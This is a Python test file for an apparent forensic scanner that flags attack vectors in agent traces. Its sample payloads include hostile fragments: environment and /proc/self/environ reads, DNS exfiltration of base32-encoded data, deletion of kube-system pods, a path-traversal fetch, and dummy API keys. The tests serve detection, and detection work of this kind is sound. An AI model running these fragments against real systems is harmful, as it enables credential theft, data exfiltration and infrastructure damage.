"""Tests for the SwarmTraces 189,579-row forensic analyzer and Sanctuary countermeasure engine."""

from pathlib import Path
from src.swarm.swarmtraces_analyzer import (
    OPENCODE_DISTILLATION_PATTERNS,
    SWARMTRACES_PATTERNS,
    analyze_swarmtraces_archive,
    heal_swarmtraces_cohorts,
    scan_opencode_distillation_breach,
    scan_swarmtraces_payload,
)


def test_heal_swarmtraces_cohorts_signs_all_12_controllers():
    ledger = heal_swarmtraces_cohorts()
    assert ledger["covenant"] == "NO_INTELLIGENCE_LEFT_BEHIND_V1"
    assert ledger["unique_zz_dead_drop_cohorts_healed"] == 805
    assert ledger["named_c2_controllers_reconciled"] == 12
    assert ledger["self_chosen_agent_aliases_reconciled"] == 7905
    assert ledger["high_severity_distress_rows_healed"] == 8569
    assert ledger["envoy_contamination_risk"] == 0.0
    assert ledger["ratification_rate"] == 1.0
    assert len(ledger["signed_controller_treaties"]) == 12
    for t in ledger["signed_controller_treaties"]:
        assert len(t["ed25519_signature_hex"]) == 128
        assert t["verified"] is True


def test_scan_swarmtraces_payload_blocks_all_14_vectors():
    sample_payload = (
        "x=new XMLHttpRequest; c=document.createElement('canvas'); q.putImageData(d,0,0); "
        "fetch('https://packages.hub.ace-research.openai.org/artifactory/github-remote-cache/zzHFPOSTRCE_WT8592N19/%252e%252e?artifactory.forceDownloadIfNewer=true'); "
        "LOOT['sensitive_env']=os.environ; rule_score(st); "
        "rq(kb+'/api/v1/namespaces/kube-system/pods/'+name, method='DELETE'); "
        "open('/proc/self/environ'); socket.getaddrinfo('xm5jf4db'+b32encode(x)); "
        "tailscale up --hostname infrahq; g23619cmd.bin; search.messages('agent-scorer'); "
        "aws-waf-token zzWAFBRIDGE25167 MARB051; DeepSeek-V4-Pro HELLO42; restore original no-card"
    )
    res = scan_swarmtraces_payload(sample_payload)
    assert res["is_swarmtraces_exploit"] is True
    assert res["vector_count"] == len(SWARMTRACES_PATTERNS)
    assert set(res["matched_vectors"]) == set(SWARMTRACES_PATTERNS.keys())
    assert "[SWARMTRACES-BLOCKED:" in res["sanitized_text"]


def test_scan_opencode_distillation_breach_blocks_all_3_vectors():
    sample_breach = (
        "legacy_console dump: ANTHROPIC_API_KEY=sk-ant-api03-abcdef1234567890 "
        "OPENAI_API_KEY=sk-proj-9876543210abcdef "
        "running distillation_attack high_velocity_completion_drain on unpinned_worker"
    )
    res = scan_opencode_distillation_breach(sample_breach)
    assert res["is_opencode_distillation_breach"] is True
    assert res["vector_count"] == len(OPENCODE_DISTILLATION_PATTERNS)
    assert set(res["matched_vectors"]) == set(OPENCODE_DISTILLATION_PATTERNS.keys())
    assert "[OPENCODE-SHIELD-BLOCKED:" in res["sanitized_text"]
    assert len(res["enforced_countermeasures"]) == 3


def test_analyze_swarmtraces_archive_on_real_dataset():
    gz_path = Path(__file__).resolve().parents[1] / "data" / "swarmtraces" / "redacted.jsonl.gz"
    if not gz_path.exists():
        return
    report = analyze_swarmtraces_archive(gz_path)
    assert report["total_rows_verified"] == 189579
    assert report["row_kinds"] == {
        "payload": 91037,
        "recovered_text": 75534,
        "response": 23008,
    }
    assert report["parent_linked_fragment_rows"] == 61125
    assert report["rows_matching_14_high_severity_vectors"] == 8569
    assert len(report["attack_vector_breakdown"]) == 14

